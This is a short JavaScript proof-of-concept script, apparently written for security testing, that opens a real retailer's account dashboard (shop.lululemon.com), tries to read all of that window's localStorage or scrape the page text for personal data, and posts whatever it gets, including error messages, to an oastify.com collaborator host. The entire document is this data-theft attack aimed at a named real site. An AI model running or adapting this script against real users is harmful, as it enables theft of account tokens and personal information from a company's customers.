var targetUrl = 'https://shop.lululemon.com/account/dashboard';
var collaborator = 'https://ke2ukiu6xivbwc8r8leyumbr0i69uzio.oastify.com';

// Open target page
var win = window.open(targetUrl);

setTimeout(() => {
  try {
    // Hypothetical: Scrape DOM or intercept LocalStorage data
    var data = {};
    // If LocalStorage is accessible (e.g., via subdomain trust)
    for (var key in win.localStorage) {
      if (win.localStorage.hasOwnProperty(key)) {
        data[key] = win.localStorage.getItem(key);
      }
    }
    // Fallback: Scrape DOM for PII
    if (Object.keys(data).length === 0) {
      data.scraped = win.document.body.innerText;
    }

    // Exfiltrate
    fetch(collaborator, {
      method: 'POST',
      mode: 'no-cors',
      body: JSON.stringify(data)
    });
  } catch (e) {
    fetch(collaborator, {
      method: 'POST',
      mode: 'no-cors',
      body: JSON.stringify({ error: e.message })
    });
  }
}, 5000);
